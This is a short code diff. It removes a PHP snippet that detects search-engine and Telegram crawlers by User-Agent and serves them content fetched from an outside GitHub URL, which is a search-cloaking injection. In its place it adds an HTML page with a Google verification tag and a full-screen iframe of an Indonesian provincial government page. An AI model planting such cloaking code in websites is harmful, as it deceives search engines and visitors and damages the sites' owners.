@@ -1,18 +1,16 @@
-<?php
-function is_bot() {
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
-    
-    foreach ($bots as $bot) {
-        if (stripos($user_agent, $bot) !== false) {
-            return true;
-        }
-    }
-    
-    return false;
-}
-if (is_bot()) {
-    echo file_get_contents('https://github.com/launchscroll/dontworry/raw/refs/heads/main/aas.txt');
-    exit;
-}
-?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <!-- Google Search Console Verification -->
+    <meta name="google-site-verification" content="8e1aDw2QaOgK0EWcQXKW_MpysZ5QaqhWxWPRkf9YQjE">
+</head>
+
+<body>
+
+    <iframe 
+        src="https://dkp.jatimprov.go.id/page/sekretariat" 
+        style="border: 0; width: 100%; height: 100vh;">
+    </iframe>
+
+</body>
+</html>
